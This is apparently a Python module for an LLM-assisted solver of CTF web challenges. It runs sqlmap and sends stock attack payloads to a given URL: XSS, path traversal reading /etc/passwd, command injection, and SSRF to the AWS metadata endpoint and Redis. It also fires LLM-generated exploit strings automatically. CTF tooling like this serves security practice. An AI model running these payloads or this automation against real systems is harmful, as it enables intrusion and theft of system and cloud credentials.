"""
Web Solver - CTF 웹 취약점 자동 풀이
"""

import asyncio
from typing import Dict, List, Optional
from dataclasses import dataclass

from .llm_reasoner import LLMReasoner, CTFAnalysis
from .tool_executor import ToolExecutor, ToolResult


@dataclass
class WebExploitResult:
    """웹 취약점 결과"""
    vulnerability_type: str
    success: bool
    flag: Optional[str]
    payload: str
    response: str
    confidence: float


class WebSolver:
    """CTF 웹 취약점 자동 풀이 엔진"""

    def __init__(self, llm: LLMReasoner, executor: ToolExecutor):
        self.llm = llm
        self.executor = executor

    async def solve(self, url: str, challenge_info: Dict) -> Dict:
        """
        웹 취약점 자동 풀이

        Args:
            url: 대상 URL
            challenge_info: 문제 정보

        Returns:
            풀이 결과
        """
        # 1. LLM으로 문제 분석
        analysis = await self.llm.analyze_challenge({
            'title': challenge_info.get('title', ''),
            'description': challenge_info.get('description', ''),
            'url': url,
            'hints': challenge_info.get('hints', [])
        })

        if analysis.category != 'web':
            return {
                'success': False,
                'error': f'Not a web challenge: {analysis.category}'
            }

        # 2. 취약점 유형별 처리
        vuln_type = analysis.vulnerability_type.lower()

        if 'sql injection' in vuln_type or 'sqli' in vuln_type:
            result = await self._solve_sqli(url, analysis)
        elif 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
            result = await self._solve_xss(url, analysis)
        elif 'lfi' in vuln_type or 'local file inclusion' in vuln_type:
            result = await self._solve_lfi(url, analysis)
        elif 'rfi' in vuln_type or 'remote file inclusion' in vuln_type:
            result = await self._solve_rfi(url, analysis)
        elif 'command injection' in vuln_type or 'rce' in vuln_type:
            result = await self._solve_command_injection(url, analysis)
        elif 'ssrf' in vuln_type:
            result = await self._solve_ssrf(url, analysis)
        else:
            # 알 수 없는 유형 → LLM에게 exploit 생성 요청
            result = await self._generic_web_exploit(url, analysis)

        return {
            'success': result.success,
            'flag': result.flag,
            'vulnerability_type': result.vulnerability_type,
            'payload': result.payload,
            'confidence': result.confidence,
            'analysis': analysis
        }

    # === SQL Injection ===

    async def _solve_sqli(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
        """SQL Injection 자동 풀이"""
        print(f"  🔍 SQL Injection 탐지 시도: {url}")

        # SQLMap 자동 실행
        sqlmap_result = await self.executor.run_sqlmap(
            url,
            options=['--batch', '--level=3', '--risk=2', '--threads=5']
        )

        if sqlmap_result.success:
            # SQLMap 결과에서 플래그 추출
            flag = self._extract_flag(sqlmap_result.output)

            if flag:
                return WebExploitResult(
                    vulnerability_type='SQL Injection',
                    success=True,
                    flag=flag,
                    payload='SQLMap automated',
                    response=sqlmap_result.output[:1000],
                    confidence=0.95
                )

        # SQLMap 실패 → LLM으로 수동 페이로드 생성
        print("  ⚠️  SQLMap 실패, LLM으로 수동 페이로드 생성")

        exploit_code = await self.llm.generate_exploit(
            analysis,
            context=f"SQLMap output:\n{sqlmap_result.output[:2000]}"
        )

        # LLM이 생성한 Python 코드 실행
        try:
            # 간단한 예제: LLM이 생성한 페이로드 추출
            payloads = self._extract_payloads_from_llm(exploit_code)

            for payload in payloads[:5]:  # 최대 5개 시도
                # 실제 구현에서는 requests 라이브러리 사용
                result = await self._test_payload(url, payload)

                if result['success']:
                    flag = self._extract_flag(result['response'])
                    return WebExploitResult(
                        vulnerability_type='SQL Injection (Manual)',
                        success=True,
                        flag=flag,
                        payload=payload,
                        response=result['response'][:1000],
                        confidence=0.75
                    )
        except Exception as e:
            print(f"  ❌ 수동 페이로드 실행 실패: {e}")

        return WebExploitResult(
            vulnerability_type='SQL Injection',
            success=False,
            flag=None,
            payload='',
            response='All attempts failed',
            confidence=0.0
        )

    # === XSS ===

    async def _solve_xss(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
        """XSS 자동 풀이"""
        print(f"  🔍 XSS 탐지 시도: {url}")

        # LLM으로 XSS 페이로드 생성
        exploit_code = await self.llm.generate_exploit(
            analysis,
            context="Generate XSS payloads to extract flag"
        )

        payloads = self._extract_payloads_from_llm(exploit_code)

        # 기본 XSS 페이로드 추가
        default_payloads = [
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<iframe src="javascript:alert(1)">',
        ]

        all_payloads = payloads + default_payloads

        for payload in all_payloads[:10]:
            result = await self._test_payload(url, payload)

            if result['success']:
                flag = self._extract_flag(result['response'])
                return WebExploitResult(
                    vulnerability_type='XSS',
                    success=True,
                    flag=flag,
                    payload=payload,
                    response=result['response'][:1000],
                    confidence=0.8
                )

        return WebExploitResult(
            vulnerability_type='XSS',
            success=False,
            flag=None,
            payload='',
            response='No XSS vulnerability found',
            confidence=0.0
        )

    # === LFI/RFI ===

    async def _solve_lfi(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
        """Local File Inclusion 자동 풀이"""
        print(f"  🔍 LFI 탐지 시도: {url}")

        # 일반적인 LFI 페이로드
        lfi_payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '/etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            'file:///etc/passwd',
        ]

        # LLM으로 추가 페이로드 생성
        exploit_code = await self.llm.generate_exploit(
            analysis,
            context="Generate LFI payloads"
        )

        llm_payloads = self._extract_payloads_from_llm(exploit_code)
        all_payloads = llm_payloads + lfi_payloads

        for payload in all_payloads[:15]:
            result = await self._test_payload(url, payload, param='file')

            if result['success'] and ('root:' in result['response'] or 'flag{' in result['response']):
                flag = self._extract_flag(result['response'])
                return WebExploitResult(
                    vulnerability_type='LFI',
                    success=True,
                    flag=flag,
                    payload=payload,
                    response=result['response'][:1000],
                    confidence=0.85
                )

        return WebExploitResult(
            vulnerability_type='LFI',
            success=False,
            flag=None,
            payload='',
            response='No LFI vulnerability found',
            confidence=0.0
        )

    async def _solve_rfi(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
        """Remote File Inclusion 자동 풀이"""
        print(f"  🔍 RFI 탐지 시도: {url}")

        # RFI는 외부 서버 필요 → LLM에게 전략 요청
        exploit_code = await self.llm.generate_exploit(
            analysis,
            context="Generate RFI exploitation strategy (need external server)"
        )

        return WebExploitResult(
            vulnerability_type='RFI',
            success=False,
            flag=None,
            payload='',
            response='RFI requires external server setup',
            confidence=0.0
        )

    # === Command Injection ===

    async def _solve_command_injection(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
        """Command Injection 자동 풀이"""
        print(f"  🔍 Command Injection 탐지 시도: {url}")

        # 일반적인 Command Injection 페이로드
        cmd_payloads = [
            '; ls',
            '| ls',
            '`ls`',
            '$(ls)',
            '; cat flag.txt',
            '| cat /flag.txt',
            '; find / -name flag.txt 2>/dev/null',
            '`cat /etc/passwd`',
        ]

        # LLM으로 추가 페이로드 생성
        exploit_code = await self.llm.generate_exploit(
            analysis,
            context="Generate command injection payloads"
        )

        llm_payloads = self._extract_payloads_from_llm(exploit_code)
        all_payloads = llm_payloads + cmd_payloads

        for payload in all_payloads[:15]:
            result = await self._test_payload(url, payload)

            if result['success']:
                flag = self._extract_flag(result['response'])
                if flag:
                    return WebExploitResult(
                        vulnerability_type='Command Injection',
                        success=True,
                        flag=flag,
                        payload=payload,
                        response=result['response'][:1000],
                        confidence=0.9
                    )

        return WebExploitResult(
            vulnerability_type='Command Injection',
            success=False,
            flag=None,
            payload='',
            response='No command injection found',
            confidence=0.0
        )

    # === SSRF ===

    async def _solve_ssrf(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
        """SSRF 자동 풀이"""
        print(f"  🔍 SSRF 탐지 시도: {url}")

        # SSRF 페이로드
        ssrf_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'file:///etc/passwd',
            'gopher://127.0.0.1:6379/_',  # Redis
        ]

        for payload in ssrf_payloads:
            result = await self._test_payload(url, payload, param='url')

            if result['success']:
                flag = self._extract_flag(result['response'])
                return WebExploitResult(
                    vulnerability_type='SSRF',
                    success=True,
                    flag=flag,
                    payload=payload,
                    response=result['response'][:1000],
                    confidence=0.8
                )

        return WebExploitResult(
            vulnerability_type='SSRF',
            success=False,
            flag=None,
            payload='',
            response='No SSRF vulnerability found',
            confidence=0.0
        )

    # === Generic Web Exploit ===

    async def _generic_web_exploit(self, url: str, analysis: CTFAnalysis) -> WebExploitResult:
        """알 수 없는 웹 취약점 → LLM에게 전체 풀이 요청"""
        print(f"  🤖 LLM 기반 일반 웹 공격 시도: {url}")

        exploit_code = await self.llm.generate_exploit(
            analysis,
            context=f"URL: {url}\nGenerate complete exploit code"
        )

        # LLM이 생성한 코드 분석
        payloads = self._extract_payloads_from_llm(exploit_code)

        for payload in payloads[:10]:
            result = await self._test_payload(url, payload)

            if result['success']:
                flag = self._extract_flag(result['response'])
                if flag:
                    return WebExploitResult(
                        vulnerability_type='Generic Web',
                        success=True,
                        flag=flag,
                        payload=payload,
                        response=result['response'][:1000],
                        confidence=0.6
                    )

        return WebExploitResult(
            vulnerability_type='Generic Web',
            success=False,
            flag=None,
            payload='',
            response='LLM-based exploit failed',
            confidence=0.0
        )

    # === Helper Methods ===

    async def _test_payload(self, url: str, payload: str, param: str = 'id', method: str = 'GET') -> Dict:
        """
        페이로드 테스트 (실제 HTTP 요청)

        Args:
            url: 대상 URL
            payload: 테스트 페이로드
            param: 파라미터 이름
            method: HTTP 메서드 (GET/POST)

        Returns:
            {'success': bool, 'response': str, 'status_code': int}
        """
        try:
            import httpx

            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                if method.upper() == 'GET':
                    response = await client.get(url, params={param: payload})
                elif method.upper() == 'POST':
                    response = await client.post(url, data={param: payload})
                else:
                    return {
                        'success': False,
                        'response': '',
                        'status_code': 0
                    }

                return {
                    'success': response.status_code == 200,
                    'response': response.text,
                    'status_code': response.status_code
                }

        except Exception as e:
            print(f"  ⚠️  HTTP 요청 실패: {e}")
            return {
                'success': False,
                'response': '',
                'status_code': 0
            }

    def _extract_flag(self, text: str) -> Optional[str]:
        """텍스트에서 플래그 추출"""
        import re

        # 일반적인 플래그 패턴
        patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[A-Za-z0-9_]+\{[^}]+\}',
        ]

        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(0)

        return None

    def _extract_payloads_from_llm(self, llm_output: str) -> List[str]:
        """LLM 출력에서 페이로드 추출"""
        payloads = []

        # 코드 블록 추출
        import re
        code_blocks = re.findall(r'```(?:python|bash)?\n(.*?)\n```', llm_output, re.DOTALL)

        for block in code_blocks:
            # 간단한 문자열 추출 (실제 구현에서는 더 정교하게)
            lines = block.split('\n')
            for line in lines:
                if 'payload' in line.lower() or "'" in line or '"' in line:
                    # 문자열 추출
                    strings = re.findall(r'["\']([^"\']+)["\']', line)
                    payloads.extend(strings)

        return payloads[:20]  # 최대 20개
